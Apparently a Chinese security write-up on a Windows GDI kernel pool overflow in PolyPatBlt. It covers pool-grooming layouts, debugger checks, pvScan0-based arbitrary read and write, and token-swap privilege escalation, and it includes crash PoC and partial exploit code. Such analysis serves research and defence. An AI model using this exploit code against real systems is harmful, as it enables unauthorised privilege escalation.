#### <a class="reference-link" name="3.5.1%E5%B0%8F%E5%88%80%E5%BF%97%E5%B8%88%E5%82%85%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"></a>3.5.1小刀志师傅内存布局

第一种是小刀志师傅的内存布局，也就是使用调色板类。<br>
小刀师傅在这里使用的是（0xDF8）SURFACE+(0x1F0)PALETTE+0x18进行布局的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c155d3feb6dbec96.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0118781f112e37b335.png)

通过阅读以下源代码，来体会一下大神对内存的设计。

①刚开始，分配2000个大小0xFE8的Bitmap对象进行内存占位，此时系统中会存在大量0x18的内存页末尾间隙。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017310d7b70b308c16.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0101296fe3cae3341b.png)

②创建3000个大小0x18的窗口类对象（窗口类名UNICODESTRING被分配在非分页内存中，且可控）进行内存间隙占位，大于2000是为了将系统中本身就存在的0x18间隙进行填充。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0120e1dd8e4b21d1bc.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01096ef79f363d74b3.png)

③将步骤1中的2000个Bitmap对象进行释放（目的进一步切割该区域内存，通过放置两个相邻原语对象进行越界操作）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01659b71ee1cffba18.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01747d8e1910f7d760.png)

④创建2000个大小0xDF8的Bitmap对象进行内存占位，此时内存中会出现大量的0x1F0的内存间隙

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01cd978a1c3ca3e55d.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012cd3029339c841a6.png)

⑤ 创建2000个大小0x1F0的Palettes进行内存占位

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0190620848d8074107.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01db0f569582d4d2f1.png)

⑥ 释放一部分创建的0x18对象，此时内存各分页中会出现大量以下布局的0x18大小的内存间隙。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0184f605975be86ebe.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013469441f97de40ab.png)

⑦ 这样之后通过调用漏洞函数PolyPatBlt，就会对随机在空闲的0x18处找一个内存块存放ENGBRUSH，之后进行初始化。因为此时有空闲的0x18内存块都在内存页末，所以说不会进行POOL_HEADER的检查，这样就不会触发BSOD了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0170898a8eca05049a.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d0ff74740a5eb6b7.png)

#### <a class="reference-link" name="3.5.2%20%E6%97%A0%E8%B0%83%E8%89%B2%E6%9D%BF%E7%B1%BB%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"></a>3.5.2 无调色板类内存布局

这种内存布局只使用Bitmap类，比较简单，但同样实用。

①创建2000个大小0xFE8的Bitmap对象进行内存占位，此时系统中会存在大量0x18的内存页末尾间隙，目的主要为了切割内存。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0152c1c23ea7a51d2f.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01a78777da5627eb0f.png)

②创建3000个大小0x18的窗口类对象（窗口类名UNICODESTRING被分配在非分页内存中，且可控）进行内存间隙占位，大于2000是为了将系统中本身就存在的0x18间隙进行填充。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0146103cf1cc07fdcb.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016795738dff05163c.png)

③将步骤①中的2000个0xFE8大小的Bitmap对象进行释放（目的进一步切割该区域内存，通过放置两个相邻原语对象进行越界操作）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ef5f86a0549e4cfa.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011820c21c6fbfbf7a.png)

④创建2000个大小0xD88的Bitmap对象进行内存占位，此时内存中会出现大量的0x260的内存间隙

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t012d8a5559e5e1234d.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016768ff2db0bc61a3.png)

⑤创建3000个大小0x260的Bitmap进行内存占位。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a5a8798c504ace40.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a0b2f8f01af9fe88.png)

⑥释放一部分创建的0x18对象，此时内存各分页中会出现大量以下布局的0x18大小的内存间隙

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01170b52c09aebef60.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b17c95faae7dd827.png)

⑦触发漏洞溢出申请ENGBRUSH对象，此时会从步骤6中产生的布局好的内存页中随机使用一个0x18内存间隙，用于存放ENGBRUSH对象。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0161d109313000cadb.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012ea83dbe7a45c905.png)

### <a class="reference-link" name="3.7%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E9%AA%8C%E8%AF%81"></a>3.7内存布局验证

这里采用的是第二种内存布局：也就是**0xd88-0x266-0x18**

首先在漏洞函数处下一个断点，因为此时在POC中，那么多次的分配和释放已经完成了。所以直接跟一步看看内存分配的情况，可以看到当前页的内存布局确实是0xd88、0x266、0x18

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e84c3686a6e9dd94.png)

### <a class="reference-link" name="3.7%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%92%8C%E6%8F%90%E6%9D%83"></a>3.7任意地址写和提权

分析完内存布局之后，就需要解决任意内核地址读写的问题，这里之前提到过了，使用SetBitmapBits这个API，修改SURFOBJ对象的pvScan0指针，指向需要恶意代码的位置。如果是任意地址读，可以通过GetBitmapBits。在这里就讲讲如何任意地址写。

**函数SetBitmapBits可以通过传入的参数对指定的Bitmap位图范围内的成员变量进行修改，因为由上面的内存布局和覆盖分析知道，当触发漏洞之后，Bitmap可控制的面积扩大到原来的6倍，根据这里设置的宽和高，相当于就是可以控制4个多内存页的数据。通过SetBitmapBits这个函数可以修改pvScan0指针实现指哪打哪的目的。**

提权的思路很简单，就是获取system的token，然后替换掉目标进程的token即可

[![](https://p3.ssl.qhimg.com/t01aa585cae1301a4bd.png)](https://p3.ssl.qhimg.com/t01aa585cae1301a4bd.png)

#### <a class="reference-link" name="3.8%20%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E9%AA%8C%E8%AF%81"></a>3.8 任意地址写验证

还是在漏洞函数处下一个断点

[![](https://p3.ssl.qhimg.com/t01d315bfbe691206e8.png)](https://p3.ssl.qhimg.com/t01d315bfbe691206e8.png)

根据调试出来的结果可以知道当前页的地址是0xfd9fc000 ，那么下一页就是0xfd9fd000 。根据思路，分配的ENGBRUSH会选择页末的0x18的地址进行初始化，也就是说会破坏掉下一个页的POOL_HEADER。同时可以看到下一页的Bitmap的格式也是宽为0xc2c，高为1

[![](https://p0.ssl.qhimg.com/t015ad76721f09736cb.png)](https://p0.ssl.qhimg.com/t015ad76721f09736cb.png)

在大小为0x260的Bitmap的位图可以查看其中的成员变量，我们关心的是pvscan0，因为这个指针可以让我们直线任意地址读写，因为0x260的Bitmap的地址是0xfd02bd88 ，所以可以查看这里的数据，可以知道此时的pvscan0的值为0xfd02bee4

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019349f9714365f306.png)

因为下一页的pool_header会被ENGBRUSH的初始化覆盖，所以为了修复pool_header，需要下下页的数据进行修复，所以这里查看下下页的数据，下下页的地址0xfd02d000 ，记录下此时的pool_header的数据

[![](https://p5.ssl.qhimg.com/t01c3f02f6c20a5a3bb.png)](https://p5.ssl.qhimg.com/t01c3f02f6c20a5a3bb.png)

接下来查看初始化之后内存的情况，断点下载ENGBRUSH运行结束的位置，也就是偏移0x57f的位置

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01bb3ebb80b6454c95.png)

此时查看下一页的内容，对比之前的内存数据，可以发现pool_header被破坏了，Bitmap的格式也被改变了，这就说明了此时Bitmap可控制的范围变为原来的6倍，**此时可控制的范围为0x4908（0xc2c*6），相当于可以控制4个页的内容**。这就为我们修改pvscan0打下了基础

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a0f7782c630342ee.png)

在继续往下之前，记录一下下一页0x260大小的Bitmap的数据，特别是pvscan0

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c1a47bcde1b3ad38.png)

为了验证pvscan0会被修改，在POC中下一个int 3断点，运行程序，再次查看这里的数据,发现pvscan0的值由0xfd9fee4变为了0xfd9fd038

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01062880f68da623ea.png)

可以查看一下这里的代码，发现确实指向是一段代码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011771f407e3f986df.png)



## 4、POC代码

### <a class="reference-link" name="4.1%20BOSD"></a>4.1 BOSD

```
#include "stdafx.h"
#pragma once

#include "targetver.h"

#include &lt;stdio.h&gt;
#include &lt;tchar.h&gt;
#include &lt;Windows.h&gt;
#include &lt;wingdi.h&gt;
#include &lt;iostream&gt;
#include &lt;Psapi.h&gt;
#pragma comment(lib, "psapi.lib")
typedef BOOL (WINAPI *PFN_PolyPatBlt)(
    HDC hdc,
    DWORD rop,
    PVOID pPoly,
    DWORD Count,
    DWORD Mode
);
PFN_PolyPatBlt PfnPolyPatBlt = NULL;
typedef struct _PATRECT `{`
    INT nXLeft;
    INT nYLeft;
    INT nWidth;
    INT nHeight;
    HBRUSH hBrush;
`}` PATRECT, *PPATRECT;
void Test()
`{`
    //获取当前桌面设备上下文的DC对象句柄
    HDC hdc = GetDC(NULL);
    //创建位图，宽为0x6D，高为0x12AE8F，色平面数为1，用一位表示一个像素
    HBITMAP hbmp = CreateBitmap(0x6D, 0x12AE8F, 1, 1, NULL);
    //通过hbmp这个位图对象获取BRUSH对象
    HBRUSH hbru = CreatePatternBrush(hbmp);
    //通过 GetProcAddress 动态获取gdi32的地址
    PfnPolyPatBlt = (PFN_PolyPatBlt)GetProcAddress(GetModuleHandleA("gdi32"), "PolyPatBlt");
    //对PATRECT结构中的成员变量进行赋值
    PATRECT ppb[1] = `{` 0 `}`;
    ppb[0].nXLeft = 0x100;
    ppb[0].nYLeft = 0x100;
    ppb[0].nWidth = 0x100;
    ppb[0].nHeight = 0x100;
    ppb[0].hBrush = hbru;
    PfnPolyPatBlt(hdc, PATCOPY, ppb, 1, 0);
`}`


int _tmain(int argc, _TCHAR* argv[])
`{`
    Test();
    return 0;
`}`
```

### <a class="reference-link" name="4.2%20memorytest"></a>4.2 memorytest

```
// memorytest.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
typedef BOOL (WINAPI *PFN_PolyPatBlt)(
    HDC hdc,
    DWORD rop,
    PVOID pPoly,
    DWORD Count,
    DWORD Mode
);
PFN_PolyPatBlt PfnPolyPatBlt = NULL;
typedef struct _PATRECT `{`
    INT nXLeft;
    INT nYLeft;
    INT nWidth;
    INT nHeight;
    HBRUSH hBrush;
`}` PATRECT, *PPATRECT;
void Test()
`{`
    //获取当前桌面设备上下文的DC对象句柄
    HDC hdc = GetDC(NULL);
    //创建位图，宽为0x12，高为0x123，色平面数为1，用一位表示一个像素
    HBITMAP hbmp = CreateBitmap(0x12, 0x123, 1, 1, NULL);
    //通过hbmp这个位图对象获取BRUSH对象
    HBRUSH hbru = CreatePatternBrush(hbmp);
    //通过 GetProcAddress 动态获取gdi32的地址
    PfnPolyPatBlt = (PFN_PolyPatBlt)GetProcAddress(GetModuleHandleA("gdi32"), "PolyPatBlt");
    //对PATRECT结构中的成员变量进行赋值
    PATRECT ppb[1] = `{` 0 `}`;
    ppb[0].nXLeft = 0x100;
    ppb[0].nYLeft = 0x100;
    ppb[0].nWidth = 0x100;
    ppb[0].nHeight = 0x100;
    ppb[0].hBrush = hbru;
    PfnPolyPatBlt(hdc, PATCOPY, ppb, 1, 0);
`}`


int _tmain(int argc, _TCHAR* argv[])
`{`
    Test();
    return 0;
`}`
```

### <a class="reference-link" name="4.3%20%E5%B0%8F%E5%88%80%E5%BF%97%E5%B8%88%E5%82%85POC"></a>4.3 小刀志师傅POC

```
// test.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include &lt;Windows.h&gt;
#include &lt;wingdi.h&gt;
#include &lt;iostream&gt;
#include &lt;Psapi.h&gt;
#pragma comment(lib, "psapi.lib")

#define POCDEBUG 0

#if POCDEBUG == 1
#define POCDEBUG_BREAK() getchar()
#elif POCDEBUG == 2
#define POCDEBUG_BREAK() __debugbreak()
#else
#define POCDEBUG_BREAK()
#endif

CONST LONG maxTimes = 2000;
CONST LONG tmpTimes = 3000;
static HBITMAP hbitmap[maxTimes] = `{` NULL `}`;
static HPALETTE hpalette[maxTimes] = `{` NULL `}`;

static DWORD    iMemHunted = NULL;
static HBITMAP  hBmpHunted = NULL;
static PDWORD   pBmpHunted = NULL;
static HPALETTE hPalExtend = NULL;

CONST LONG iExtPaleHmgr = 809;
CONST LONG iExtcEntries = 814;
CONST LONG iExtPalColor = 828;

typedef struct _PATRECT `{`
    INT nXLeft;
    INT nYLeft;
    INT nWidth;
    INT nHeight;
    HBRUSH hBrush;
`}` PATRECT, *PPATRECT;

typedef BOOL (WINAPI *pfPolyPatBlt)(HDC hdc, DWORD rop, PPATRECT pPoly, DWORD Count, DWORD Mode);

static
    BOOL xxCreateBitmaps(INT nWidth, INT Height, UINT nbitCount)
`{`
    POCDEBUG_BREAK();
    for (LONG i = 0; i &lt; maxTimes; i++)
    `{`
        hbitmap[i] = CreateBitmap(nWidth, Height, 1, nbitCount, NULL);
        if (hbitmap[i] == NULL)
        `{`
            return FALSE;
        `}`
    `}`
    return TRUE;
`}`

static
    BOOL xxDeleteBitmaps(VOID)
`{`
    BOOL bReturn = FALSE;
    POCDEBUG_BREAK();
    for (LONG i = 0; i &lt; maxTimes; i++)
    `{`
        bReturn = DeleteObject(hbitmap[i]);
        hbitmap[i] = NULL;
    `}`
    return bReturn;
`}`

static
    BOOL xxRegisterWndClasses(LPCSTR menuName)
`{`
    POCDEBUG_BREAK();
    CHAR buf[0x10] = `{` 0 `}`;
    for (LONG i = 0; i &lt; tmpTimes; i++)
    `{`
        WNDCLASSEXA Class = `{` 0 `}`;
        sprintf(buf, "CLS_%d", i);
        Class.lpfnWndProc = DefWindowProcA;
        Class.lpszClassName = buf;
        Class.lpszMenuName = menuName;
        Class.cbSize = sizeof(WNDCLASSEXA);
        if (!RegisterClassExA(&amp;Class))
        `{`
            return FALSE;
        `}`
    `}`
    return TRUE;
`}`

static
    BOOL xxDigHoleInWndClasses(LONG b, LONG e)
`{`
    BOOL bReturn = FALSE;
    CHAR buf[0x10] = `{` 0 `}`;
    for (LONG i = b; i &lt; e; i++)
    `{`
        sprintf(buf, "CLS_%d", i);
        bReturn = UnregisterClassA(buf, NULL);
    `}`
    return bReturn;
`}`

static
    BOOL xxUnregisterWndClasses(VOID)
`{`
    BOOL bReturn = FALSE;
    CHAR buf[0x10] = `{` 0 `}`;
    for (LONG i = 0; i &lt; tmpTimes; i++)
    `{`
        sprintf(buf, "CLS_%d", i);
        bReturn = UnregisterClassA(buf, NULL);
    `}`
    return bReturn;
`}`

static
    BOOL xxCreatePalettes(ULONG cEntries)
`{`
    BOOL bReturn = FALSE;
    POCDEBUG_BREAK();
    PLOGPALETTE pal = NULL;
    // 0x64*4+0x58+8=0x1f0
    pal = (PLOGPALETTE)malloc(sizeof(LOGPALETTE) + cEntries * sizeof(PALETTEENTRY));
    pal-&gt;palVersion = 0x300;
    pal-&gt;palNumEntries = cEntries;
    for (LONG i = 0; i &lt; maxTimes; i++)
    `{`
        hpalette[i] = CreatePalette(pal);
        if (hpalette[i] == NULL)
        `{`
            bReturn = FALSE;
            break;
        `}`
        bReturn = TRUE;
    `}`
    free(pal);
    return bReturn;
`}`

static
    BOOL xxDeletePalettes(VOID)
`{`
    BOOL bReturn = FALSE;
    POCDEBUG_BREAK();
    for (LONG i = 0; i &lt; maxTimes; i++)
    `{`
        bReturn = DeleteObject(hpalette[i]);
        hpalette[i] = NULL;
    `}`
    return bReturn;
`}`

static
    BOOL xxRetrieveBitmapBits(VOID)
`{`
    pBmpHunted = static_cast&lt;PDWORD&gt;(malloc(0x1000));
    ZeroMemory(pBmpHunted, 0x1000);
    LONG index = -1;
    LONG iLeng = -1;
    POCDEBUG_BREAK();
    for (LONG i = 0; i &lt; maxTimes; i++)
    `{`
        iLeng = GetBitmapBits(hbitmap[i], 0x1000, pBmpHunted);
        if (iLeng &lt; 0xCA0)
        `{`
            continue;
        `}`
        index = i;
        std::cout &lt;&lt; "LOCATE: " &lt;&lt; '[' &lt;&lt; i &lt;&lt; ']' &lt;&lt; hbitmap[i] &lt;&lt; std::endl;
        hBmpHunted = hbitmap[i];
        break;
    `}`
    if (index == -1)
    `{`
        std::cout &lt;&lt; "FAILED: " &lt;&lt; (PVOID)(-1) &lt;&lt; std::endl;
        return FALSE;
    `}`
    return TRUE;
`}`

static
    VOID xxOutputBitmapBits(VOID)
`{`
    POCDEBUG_BREAK();
    for (LONG i = 0; i &lt; 0x1000 / sizeof(DWORD); i++)
    `{`
        std::cout &lt;&lt; '[';
        std::cout.fill('0');
        std::cout.width(4);
        std::cout &lt;&lt; i &lt;&lt; ']' &lt;&lt; (PVOID)pBmpHunted[i];
        if (((i + 1) % 4) != 0)
        `{`
            std::cout &lt;&lt; " ";
        `}`
        else
        `{`
            std::cout &lt;&lt; std::endl;
        `}`
    `}`
    std::cout.width(0);
`}`

static
    BOOL xxGetExtendPalette(HPALETTE hHandle)
`{`
    LONG index = -1;
    POCDEBUG_BREAK();
    for (LONG i = 0; i &lt; maxTimes; i++)
    `{`
        if (hpalette[i] != hHandle)
        `{`
            continue;
        `}`
        index = i;
        std::cout &lt;&lt; "LOCATE: " &lt;&lt; '[' &lt;&lt; i &lt;&lt; ']' &lt;&lt; hpalette[i] &lt;&lt; std::endl;
        hPalExtend = hpalette[i];
        break;
    `}`
    if (index == -1)
    `{`
        std::cout &lt;&lt; "FAILED: " &lt;&lt; (PVOID)(-1) &lt;&lt; std::endl;
        return FALSE;
    `}`
    return TRUE;
`}`

static
    BOOL xxPoint(LONG id, DWORD Value)
`{`
    LONG iLeng = 0x00;
    pBmpHunted[id] = Value;
    iLeng = SetBitmapBits(hBmpHunted, 0xD00, pBmpHunted);
    if (iLeng &lt; 0xD00)
    `{`
        return FALSE;
    `}`
